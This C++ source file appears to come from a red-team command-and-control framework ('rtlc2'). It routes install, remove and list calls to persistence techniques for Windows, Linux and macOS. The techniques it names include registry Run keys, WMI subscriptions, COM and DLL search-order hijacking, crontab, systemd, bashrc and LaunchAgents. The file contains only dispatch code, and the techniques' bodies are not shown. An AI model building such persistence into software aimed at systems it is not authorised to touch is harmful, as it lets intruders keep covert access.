// persistence.cpp - Cross-platform persistence dispatcher
// Routes install/remove/list calls to the correct platform-specific implementation.

#include "persistence.h"
#include <sstream>

namespace rtlc2 {
namespace persistence {

// -------------------------------------------------------------------
// Install - dispatch to platform-specific installer
// -------------------------------------------------------------------
PersistResult Install(const PersistConfig& cfg) {
    switch (cfg.technique) {
#ifdef RTLC2_WINDOWS
        case Technique::RegistryRunKey:      return InstallRegistryRunKey(cfg);
        case Technique::ScheduledTask:       return InstallScheduledTask(cfg);
        case Technique::WMISubscription:     return InstallWMISubscription(cfg);
        case Technique::ServiceInstall:      return InstallService(cfg);
        case Technique::StartupFolder:       return InstallStartupFolder(cfg);
        case Technique::COMHijack:           return InstallCOMHijack(cfg);
        case Technique::DLLSearchOrder:      return InstallDLLSearchOrder(cfg);
        case Technique::RegistryLogonScript: return InstallRegistryLogonScript(cfg);
#endif

#ifdef RTLC2_LINUX
        case Technique::Crontab:             return InstallCrontab(cfg);
        case Technique::SystemdService:      return InstallSystemdService(cfg);
        case Technique::BashRC:              return InstallBashRC(cfg);
#endif

#ifdef RTLC2_MACOS
        case Technique::Crontab:             return InstallCrontab(cfg);
        case Technique::BashRC:              return InstallBashRC(cfg);
        case Technique::LaunchAgent:         return InstallLaunchAgent(cfg);
        case Technique::LaunchDaemon:        return InstallLaunchDaemon(cfg);
#endif

        default:
            return {false, "Unsupported persistence technique (" +
                    std::to_string(static_cast<int>(cfg.technique)) +
                    ") on this platform", cfg.technique};
    }
}

// -------------------------------------------------------------------
// Remove - dispatch to platform-specific remover
// -------------------------------------------------------------------
PersistResult Remove(const PersistConfig& cfg) {
    switch (cfg.technique) {
#ifdef RTLC2_WINDOWS
        case Technique::RegistryRunKey:      return RemoveRegistryRunKey(cfg);
        case Technique::ScheduledTask:       return RemoveScheduledTask(cfg);
        case Technique::WMISubscription:     return RemoveWMISubscription(cfg);
        case Technique::ServiceInstall:      return RemoveService(cfg);
        case Technique::StartupFolder:       return RemoveStartupFolder(cfg);
        case Technique::COMHijack:           return RemoveCOMHijack(cfg);
        case Technique::DLLSearchOrder:      return RemoveDLLSearchOrder(cfg);
        case Technique::RegistryLogonScript: return RemoveRegistryLogonScript(cfg);
#endif

#ifdef RTLC2_LINUX
        case Technique::Crontab:             return RemoveCrontab(cfg);
        case Technique::SystemdService:      return RemoveSystemdService(cfg);
        case Technique::BashRC:              return RemoveBashRC(cfg);
#endif

#ifdef RTLC2_MACOS
        case Technique::Crontab:             return RemoveCrontab(cfg);
        case Technique::BashRC:              return RemoveBashRC(cfg);
        case Technique::LaunchAgent:         return RemoveLaunchAgent(cfg);
        case Technique::LaunchDaemon:        return RemoveLaunchDaemon(cfg);
#endif

        default:
            return {false, "Unsupported persistence technique (" +
                    std::to_string(static_cast<int>(cfg.technique)) +
                    ") on this platform", cfg.technique};
    }
}

// -------------------------------------------------------------------
// ListInstalled - enumerate known persistence on this platform
// -------------------------------------------------------------------
std::string ListInstalled() {
    std::ostringstream ss;
    ss << "=== Installed Persistence ===\n";

#ifdef RTLC2_WINDOWS
    ss << "[Windows]\n";
    ss << "  Supported: RegistryRunKey(0), ScheduledTask(1), WMISubscription(2),\n";
    ss << "             ServiceInstall(3), StartupFolder(4), COMHijack(5),\n";
    ss << "             DLLSearchOrder(6), RegistryLogonScript(7)\n";
    ss << "  (Use technique ID with 'unpersist' to remove)\n";
#endif

#ifdef RTLC2_LINUX
    ss << "[Linux]\n";
    ss << "  Supported: Crontab(20), SystemdService(21), BashRC(22)\n";
    ss << "  (Use technique ID with 'unpersist' to remove)\n";
#endif

#ifdef RTLC2_MACOS
    ss << "[macOS]\n";
    ss << "  Supported: Crontab(20), BashRC(22), LaunchAgent(30), LaunchDaemon(31)\n";
    ss << "  (Use technique ID with 'unpersist' to remove)\n";
#endif

    return ss.str();
}

} // namespace persistence
} // namespace rtlc2
